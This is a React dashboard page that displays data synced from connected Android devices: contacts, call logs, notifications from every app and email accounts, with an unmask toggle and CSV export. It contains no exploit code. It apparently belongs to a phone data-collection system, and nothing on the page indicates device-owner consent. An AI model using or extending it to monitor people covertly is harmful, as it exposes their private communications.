import { useState, useEffect } from 'react'
import { useQuery } from 'react-query'
import Link from 'next/link'
import { deviceAPI, notificationsAPI, emailAccountsAPI, contactsAPI, callLogsAPI, messagesAPI } from '../lib/api'
import { Smartphone, Users, Phone, Bell, MessageSquare, Mail, Database, Filter, Search, Download, RefreshCw, Eye, EyeOff, Activity } from 'lucide-react'
import toast from 'react-hot-toast'

export default function DataViewer() {
  const [selectedDevice, setSelectedDevice] = useState(null)
  const [activeDataType, setActiveDataType] = useState('contacts')
  const [searchTerm, setSearchTerm] = useState('')
  const [showSensitiveData, setShowSensitiveData] = useState(false)
  const [itemsPerPage, setItemsPerPage] = useState(100)
  const [currentPage, setCurrentPage] = useState(1)
  const [dateFilter, setDateFilter] = useState('all') // all, today, yesterday, last7days, last30days
  const [expandedText, setExpandedText] = useState({}) // Track expanded text by index
  const [popupData, setPopupData] = useState(null) // { type: 'message'|'notification', data: {...} }

  // Devices data
  const { data: devices, isLoading: devicesLoading } = useQuery(
    'devices',
    async () => {
      const response = await deviceAPI.getAll()
      return response?.data?.data || []
    },
    {
      refetchInterval: 30000,
      onSuccess: (data) => {
        console.log('DataViewer - Devices data:', data)
      },
      onError: (error) => {
        toast.error('Failed to fetch devices')
        console.error('Error fetching devices:', error)
      }
    }
  )

  // Contacts data with server-side filtering and pagination
  const { data: contactsData, isLoading: contactsLoading } = useQuery(
    ['contacts', selectedDevice?.deviceId, searchTerm, dateFilter, currentPage, itemsPerPage],
    async () => {
      if (!selectedDevice) return null
      const response = await contactsAPI.getAll(selectedDevice.deviceId, {
        page: currentPage,
        limit: itemsPerPage,
        search: searchTerm,
        dateFilter
      })
      return response?.data || { data: [], pagination: { total: 0, current: 1, pages: 1, limit: itemsPerPage } }
    },
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  // Call logs data with server-side filtering and pagination
  const { data: callLogsData, isLoading: callLogsLoading } = useQuery(
    ['callLogs', selectedDevice?.deviceId, searchTerm, dateFilter, currentPage, itemsPerPage],
    async () => {
      if (!selectedDevice) return null
      const response = await callLogsAPI.getAll(selectedDevice.deviceId, {
        page: currentPage,
        limit: itemsPerPage,
        search: searchTerm,
        dateFilter
      })
      return response?.data || { data: [], pagination: { total: 0, current: 1, pages: 1, limit: itemsPerPage } }
    },
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  // Messages data with server-side filtering and pagination
  const { data: messagesData, isLoading: messagesLoading } = useQuery(
    ['messages', selectedDevice?.deviceId, searchTerm, dateFilter, currentPage, itemsPerPage],
    async () => {
      if (!selectedDevice) return null
      const response = await messagesAPI.getAll(selectedDevice.deviceId, {
        page: currentPage,
        limit: itemsPerPage,
        search: searchTerm,
        dateFilter
      })
      return response?.data || { data: [], pagination: { total: 0, current: 1, pages: 1, limit: itemsPerPage } }
    },
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  // Notifications data with server-side filtering and pagination
  const { data: notificationsData, isLoading: notificationsLoading } = useQuery(
    ['notifications', selectedDevice?.deviceId, searchTerm, dateFilter, currentPage, itemsPerPage],
    async () => {
      if (!selectedDevice) return null
      const response = await notificationsAPI.getAll(selectedDevice.deviceId, {
        page: currentPage,
        limit: itemsPerPage,
        search: searchTerm,
        dateFilter
      })
      return response?.data || { data: [], pagination: { total: 0, current: 1, pages: 1, limit: itemsPerPage } }
    },
    {
      enabled: !!selectedDevice,
      refetchInterval: 30000
    }
  )

  // Email accounts data with server-side filtering and pagination
  const { data: emailData, isLoading: emailLoading } = useQuery(
    ['emails', selectedDevice?.deviceId, searchTerm, dateFilter, currentPage, itemsPerPage],
    async () => {
      if (!selectedDevice) return null
      const response = await emailAccountsAPI.getAll(selectedDevice.deviceId, {
        page: currentPage,
        limit: itemsPerPage,
        search: searchTerm,
        dateFilter
      })
      return response?.data || { data: [], pagination: { total: 0, current: 1, pages: 1, limit: itemsPerPage } }
    },
    {
      enabled: !!selectedDevice,
      refetchInterval: 60000
    }
  )

  const dataTypes = [
    { key: 'contacts', label: 'Contacts', icon: Users, count: contactsData?.pagination?.total || 0 },
    { key: 'callLogs', label: 'Call Logs', icon: Phone, count: callLogsData?.pagination?.total || 0 },
    { key: 'messages', label: 'Messages (Disabled)', icon: MessageSquare, count: 0, disabled: true },
    { key: 'notifications', label: 'Notifications', icon: Bell, count: notificationsData?.pagination?.total || 0 },
    { key: 'emails', label: 'Email Accounts', icon: Mail, count: emailData?.pagination?.total || 0 }
  ]

  const getCurrentData = () => {
    if (!selectedDevice) return []
    
    const dataMap = {
      contacts: contactsData?.data || [],
      callLogs: callLogsData?.data || [],
      messages: messagesData?.data || [],
      notifications: notificationsData?.data || [],
      emails: emailData?.data || []
    }
    
    return dataMap[activeDataType] || []
  }

  const getCurrentPagination = () => {
    const paginationMap = {
      contacts: contactsData?.pagination,
      callLogs: callLogsData?.pagination,
      messages: messagesData?.pagination,
      notifications: notificationsData?.pagination,
      emails: emailData?.pagination
    }
    
    return paginationMap[activeDataType] || { current: 1, pages: 1, total: 0, limit: itemsPerPage }
  }

  const formatDate = (timestamp) => {
    if (!timestamp) return 'N/A'
    return new Date(timestamp).toLocaleString()
  }

  const formatDuration = (seconds) => {
    if (!seconds) return '0s'
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return mins > 0 ? `${mins}m ${secs}s` : `${secs}s`
  }

  const maskSensitiveData = (text) => {
    if (!text || showSensitiveData) return text
    if (text.length <= 4) return '*'.repeat(text.length)
    return text.substring(0, 2) + '*'.repeat(text.length - 4) + text.substring(text.length - 2)
  }

  const renderExpandableText = (text, index, field) => {
    const maskedText = maskSensitiveData(text || 'N/A')
    const isExpanded = expandedText[`${index}-${field}`]
    const shouldTruncate = maskedText.length > 200
    
    if (!shouldTruncate) {
      return (
        <div className="whitespace-pre-wrap break-words">
          {maskedText}
        </div>
      )
    }

    return (
      <div>
        <div className={`whitespace-pre-wrap break-words ${!isExpanded ? 'line-clamp-3' : ''}`}>
          {maskedText}
        </div>
        <button
          onClick={() => setExpandedText(prev => ({
            ...prev,
            [`${index}-${field}`]: !isExpanded
          }))}
          className="mt-1 text-xs text-blue-600 hover:text-blue-800 font-medium"
        >
          {isExpanded ? 'Show Less' : 'Show More'}
        </button>
      </div>
    )
  }

  const renderTextWithPopup = (text, index, field, item, type) => {
    const maskedText = maskSensitiveData(text || 'N/A')
    
    return (
      <div className="flex items-start justify-between">
        <div className="flex-1">
          <div className="whitespace-pre-wrap break-words line-clamp-3">
            {maskedText}
          </div>
        </div>
        <button
          onClick={() => setPopupData({ type, data: item, field })}
          className="ml-2 flex-shrink-0 px-2 py-1 text-xs bg-blue-100 text-blue-700 rounded hover:bg-blue-200 transition-colors"
        >
          View Full
        </button>
      </div>
    )
  }

  const exportData = () => {
    const data = getCurrentData()
    const csvContent = convertToCSV(data, activeDataType)
    const blob = new Blob([csvContent], { type: 'text/csv' })
    const url = window.URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `${activeDataType}_${selectedDevice?.deviceId}_${new Date().toISOString().split('T')[0]}.csv`
    a.click()
    window.URL.revokeObjectURL(url)
    toast.success(`Exported ${data.length} ${activeDataType} records`)
  }

  const convertToCSV = (data, type) => {
    if (!data.length) return ''
    
    const headers = Object.keys(data[0])
    const csvRows = [headers.join(',')]
    
    data.forEach(item => {
      const values = headers.map(header => {
        const value = item[header]
        return typeof value === 'string' ? `"${value.replace(/"/g, '""')}"` : value
      })
      csvRows.push(values.join(','))
    })
    
    return csvRows.join('\n')
  }

  const renderDataTable = () => {
    const data = getCurrentData()
    const dataArray = Array.isArray(data) ? data : []
    
    if (!dataArray.length) {
      return (
        <div className="text-center py-8">
          <Database className="mx-auto h-12 w-12 text-gray-400" />
          <h3 className="mt-2 text-sm font-medium text-gray-900">No data found</h3>
          <p className="mt-1 text-sm text-gray-500">
            {searchTerm ? 'Try adjusting your search terms.' : 'No data available for this type.'}
          </p>
        </div>
      )
    }

    const getTableHeaders = () => {
      switch (activeDataType) {
        case 'contacts':
          return ['Name', 'Phone Number', 'Email', 'Synced At']
        case 'callLogs':
          return ['Phone Number', 'Type', 'Duration', 'Date', 'Synced At']
        case 'messages':
          return ['Address', 'Type', 'Body', 'Date', 'Synced At']
        case 'notifications':
          return ['App', 'Title', 'Text', 'Date', 'Synced At']
        case 'emails':
          return ['Email Address', 'Account Name', 'Account Type', 'Provider', 'Status', 'Last Sync']
        default:
          return []
      }
    }

    const renderTableRow = (item, index) => {
      switch (activeDataType) {
        case 'contacts':
          return (
            <tr key={index} className="hover:bg-gray-50">
              <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">
                {maskSensitiveData(item.name || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {maskSensitiveData(item.phoneNumber || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {maskSensitiveData(item.email || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.syncedAt)}
              </td>
            </tr>
          )
        case 'callLogs':
          return (
            <tr key={index} className="hover:bg-gray-50">
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                {maskSensitiveData(item.phoneNumber || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                <span className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                  item.type === 'INCOMING' ? 'bg-green-100 text-green-800' :
                  item.type === 'OUTGOING' ? 'bg-blue-100 text-blue-800' :
                  'bg-gray-100 text-gray-800'
                }`}>
                  {item.type || 'UNKNOWN'}
                </span>
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDuration(item.duration)}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.timestamp)}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.syncedAt)}
              </td>
            </tr>
          )
        case 'messages':
          return (
            <tr key={index} className="hover:bg-gray-50">
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                {maskSensitiveData(item.address || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                <span className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                  item.type === 'INBOX' ? 'bg-green-100 text-green-800' :
                  item.type === 'SENT' ? 'bg-blue-100 text-blue-800' :
                  'bg-gray-100 text-gray-800'
                }`}>
                  {item.type || 'UNKNOWN'}
                </span>
              </td>
              <td className="px-6 py-4 text-sm text-gray-500">
                <div className="max-w-md">
                  {renderTextWithPopup(item.body, index, 'body', item, 'message')}
                </div>
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.timestamp)}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.syncedAt)}
              </td>
            </tr>
          )
        case 'notifications':
          return (
            <tr key={index} className="hover:bg-gray-50">
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                {item.packageName || 'N/A'}
              </td>
              <td className="px-6 py-4 text-sm text-gray-500">
                <div className="max-w-md">
                  {renderTextWithPopup(item.title, index, 'title', item, 'notification')}
                </div>
              </td>
              <td className="px-6 py-4 text-sm text-gray-500">
                <div className="max-w-md">
                  {renderTextWithPopup(item.text, index, 'text', item, 'notification')}
                </div>
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.timestamp)}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.syncedAt)}
              </td>
            </tr>
          )
        case 'emails':
          return (
            <tr key={index} className="hover:bg-gray-50">
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                {maskSensitiveData(item.emailAddress || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {maskSensitiveData(item.accountName || 'N/A')}
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-purple-100 text-purple-800">
                  {item.accountType || 'UNKNOWN'}
                </span>
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                <span className="inline-flex px-2 py-1 text-xs font-semibold rounded-full bg-blue-100 text-blue-800">
                  {item.provider || 'N/A'}
                </span>
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                <span className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                  item.isActive ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
                }`}>
                  {item.isActive ? 'Active' : 'Inactive'}
                </span>
              </td>
              <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                {formatDate(item.lastSyncTime)}
              </td>
            </tr>
          )
        default:
          return null
      }
    }

    return (
      <div className="overflow-x-auto">
        <table className="min-w-full divide-y divide-gray-200" style={{ minWidth: '1200px' }}>
          <thead className="bg-gray-50">
            <tr>
              {getTableHeaders().map((header, index) => (
                <th key={index} className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {header}
                </th>
              ))}
            </tr>
          </thead>
          <tbody className="bg-white divide-y divide-gray-200">
            {dataArray.map((item, index) => renderTableRow(item, index))}
          </tbody>
        </table>
      </div>
    )
  }

  if (devicesLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="mx-auto h-8 w-8 text-gray-400 animate-spin" />
          <p className="mt-2 text-sm text-gray-500">Loading devices...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-gray-900">Data Viewer</h1>
              <p className="mt-2 text-sm text-gray-600">
                View and manage all synced data from connected devices
              </p>
            </div>
            <div className="flex items-center space-x-4">
              <Link
                href="/"
                className="flex items-center space-x-2 bg-gray-600 text-white px-4 py-2 rounded-lg hover:bg-gray-700"
              >
                <Activity className="h-4 w-4" />
                <span>Dashboard</span>
              </Link>
              <Link
                href="/devices"
                className="flex items-center space-x-2 bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700"
              >
                <Smartphone className="h-4 w-4" />
                <span>Devices</span>
              </Link>
            </div>
          </div>
        </div>

        {/* Device Selection */}
        <div className="bg-white rounded-lg shadow p-6 mb-6">
          <h2 className="text-lg font-medium text-gray-900 mb-4">Select Device</h2>
          {devicesLoading ? (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
              <p className="mt-2 text-sm text-gray-600">Loading devices...</p>
            </div>
          ) : (
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {(Array.isArray(devices) ? devices : []).map((device) => (
                <div
                  key={device.deviceId}
                  onClick={() => setSelectedDevice(device)}
                  className={`p-4 border rounded-lg cursor-pointer transition-colors ${
                    selectedDevice?.deviceId === device.deviceId
                      ? 'border-blue-500 bg-blue-50'
                      : 'border-gray-200 hover:border-gray-300'
                  }`}
                >
                  <div className="flex items-center">
                    <Smartphone className="h-5 w-5 text-gray-400 mr-3" />
                    <div>
                      <p className="text-sm font-medium text-gray-900">{device.deviceName || 'Unknown Device'}</p>
                      <p className="text-xs text-gray-500">{device.deviceId}</p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {selectedDevice && (
          <>
            {/* Data Type Tabs */}
            <div className="bg-white rounded-lg shadow mb-6">
              <div className="border-b border-gray-200">
                <nav className="-mb-px flex space-x-8 px-6">
                  {dataTypes.map((dataType) => {
                    const Icon = dataType.icon
                    const isDisabled = dataType.disabled
                    return (
                      <button
                        key={dataType.key}
                        onClick={() => {
                          if (!isDisabled) {
                            setActiveDataType(dataType.key)
                            setCurrentPage(1)
                            setSearchTerm('')
                          }
                        }}
                        disabled={isDisabled}
                        className={`py-4 px-1 border-b-2 font-medium text-sm flex items-center ${
                          isDisabled
                            ? 'border-transparent text-gray-400 cursor-not-allowed'
                            : activeDataType === dataType.key
                            ? 'border-blue-500 text-blue-600'
                            : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                        }`}
                      >
                        <Icon className={`h-4 w-4 mr-2 ${isDisabled ? 'opacity-50' : ''}`} />
                        {dataType.label}
                        <span className={`ml-2 py-0.5 px-2 rounded-full text-xs ${
                          isDisabled 
                            ? 'bg-gray-200 text-gray-400' 
                            : 'bg-gray-100 text-gray-900'
                        }`}>
                          {dataType.count}
                        </span>
                      </button>
                    )
                  })}
                </nav>
              </div>
            </div>

            {/* Controls */}
            <div className="bg-white rounded-lg shadow p-6 mb-6">
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                <div className="flex items-center space-x-4">
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                    <input
                      type="text"
                      placeholder={`Search ${activeDataType} by name, title, content...`}
                      value={searchTerm}
                      onChange={(e) => {
                        setSearchTerm(e.target.value)
                        setCurrentPage(1)
                      }}
                      className="pl-10 pr-4 py-2 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"
                    />
                  </div>
                  <select
                    value={dateFilter}
                    onChange={(e) => {
                      setDateFilter(e.target.value)
                      setCurrentPage(1)
                    }}
                    className="border border-gray-300 rounded-md px-3 py-2 text-sm"
                  >
                    <option value="all">All Time</option>
                    <option value="today">Today</option>
                    <option value="yesterday">Yesterday</option>
                    <option value="last7days">Last 7 Days</option>
                    <option value="last30days">Last 30 Days</option>
                  </select>
                  <select
                    value={itemsPerPage}
                    onChange={(e) => {
                      setItemsPerPage(Number(e.target.value))
                      setCurrentPage(1)
                    }}
                    className="border border-gray-300 rounded-md px-3 py-2 text-sm"
                  >
                    <option value={50}>50 per page</option>
                    <option value={100}>100 per page</option>
                    <option value={200}>200 per page</option>
                    <option value={500}>500 per page</option>
                  </select>
                  <button
                    onClick={() => setShowSensitiveData(!showSensitiveData)}
                    className="flex items-center px-3 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50"
                  >
                    {showSensitiveData ? <EyeOff className="h-4 w-4 mr-2" /> : <Eye className="h-4 w-4 mr-2" />}
                    {showSensitiveData ? 'Hide' : 'Show'} Sensitive Data
                  </button>
                </div>
                <div className="flex items-center space-x-4">
                  <button
                    onClick={exportData}
                    className="flex items-center px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 text-sm font-medium"
                  >
                    <Download className="h-4 w-4 mr-2" />
                    Export CSV
                  </button>
                </div>
              </div>
            </div>

            {/* Data Table */}
            <div className="bg-white rounded-lg shadow">
              <div className="px-6 py-4 border-b border-gray-200">
                <h3 className="text-lg font-medium text-gray-900">
                  {activeDataType.charAt(0).toUpperCase() + activeDataType.slice(1)} 
                  ({getCurrentPagination().total} total, {getCurrentData().length} shown)
                </h3>
              </div>
              <div className="p-6">
                {activeDataType === 'messages' ? (
                  <div className="text-center py-12">
                    <MessageSquare className="mx-auto h-12 w-12 text-gray-400 mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 mb-2">SMS Messages Disabled</h3>
                    <p className="text-gray-500 max-w-md mx-auto">
                      SMS message collection has been disabled due to Android security restrictions. 
                      Modern Android versions (13+) require special permissions for SMS access that are 
                      restricted for security reasons.
                    </p>
                    <div className="mt-4 text-sm text-gray-400">
                      <p>Available alternatives:</p>
                      <ul className="mt-2 space-y-1">
                        <li>• WhatsApp messages (if available)</li>
                        <li>• Call logs</li>
                        <li>• Contact information</li>
                        <li>• Notifications</li>
                      </ul>
                    </div>
                  </div>
                ) : (
                  renderDataTable()
                )}
              </div>

              {/* Pagination */}
              {getCurrentPagination().pages > 1 && (
                <div className="px-6 py-4 border-t border-gray-200">
                  <div className="flex items-center justify-between">
                    <div className="text-sm text-gray-700">
                      Showing {((getCurrentPagination().current - 1) * getCurrentPagination().limit) + 1} to {Math.min(getCurrentPagination().current * getCurrentPagination().limit, getCurrentPagination().total)} of {getCurrentPagination().total} results
                    </div>
                    <div className="flex space-x-2">
                      <button
                        onClick={() => setCurrentPage(Math.max(1, getCurrentPagination().current - 1))}
                        disabled={getCurrentPagination().current === 1}
                        className="px-3 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        Previous
                      </button>
                      <span className="px-3 py-2 text-sm text-gray-700">
                        Page {getCurrentPagination().current} of {getCurrentPagination().pages}
                      </span>
                      <button
                        onClick={() => setCurrentPage(Math.min(getCurrentPagination().pages, getCurrentPagination().current + 1))}
                        disabled={getCurrentPagination().current === getCurrentPagination().pages}
                        className="px-3 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        Next
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </>
        )}

        {/* Popup Modal */}
        {popupData && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
            <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[80vh] overflow-hidden">
              <div className="flex items-center justify-between p-6 border-b border-gray-200">
                <h3 className="text-lg font-medium text-gray-900">
                  {popupData.type === 'message' ? 'Message Details' : 'Notification Details'}
                </h3>
                <button
                  onClick={() => setPopupData(null)}
                  className="text-gray-400 hover:text-gray-600 transition-colors"
                >
                  <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
              
              <div className="p-6 overflow-y-auto max-h-[60vh]">
                {popupData.type === 'message' && (
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">From/To:</label>
                      <p className="text-sm text-gray-900">{maskSensitiveData(popupData.data.address || 'N/A')}</p>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Type:</label>
                      <span className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                        popupData.data.type === 'INBOX' ? 'bg-green-100 text-green-800' :
                        popupData.data.type === 'SENT' ? 'bg-blue-100 text-blue-800' :
                        'bg-gray-100 text-gray-800'
                      }`}>
                        {popupData.data.type || 'UNKNOWN'}
                      </span>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Date:</label>
                      <p className="text-sm text-gray-900">{formatDate(popupData.data.timestamp)}</p>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Message:</label>
                      <div className="mt-1 p-3 bg-gray-50 rounded-md">
                        <div className="whitespace-pre-wrap break-words text-sm text-gray-900">
                          {maskSensitiveData(popupData.data.body || 'N/A')}
                        </div>
                      </div>
                    </div>
                  </div>
                )}
                
                {popupData.type === 'notification' && (
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">App:</label>
                      <p className="text-sm text-gray-900">{popupData.data.packageName || 'N/A'}</p>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Date:</label>
                      <p className="text-sm text-gray-900">{formatDate(popupData.data.timestamp)}</p>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Title:</label>
                      <div className="mt-1 p-3 bg-gray-50 rounded-md">
                        <div className="whitespace-pre-wrap break-words text-sm text-gray-900">
                          {maskSensitiveData(popupData.data.title || 'N/A')}
                        </div>
                      </div>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Content:</label>
                      <div className="mt-1 p-3 bg-gray-50 rounded-md">
                        <div className="whitespace-pre-wrap break-words text-sm text-gray-900">
                          {maskSensitiveData(popupData.data.text || 'N/A')}
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
              
              <div className="flex items-center justify-end p-6 border-t border-gray-200">
                <button
                  onClick={() => setPopupData(null)}
                  className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700 transition-colors"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  )
} 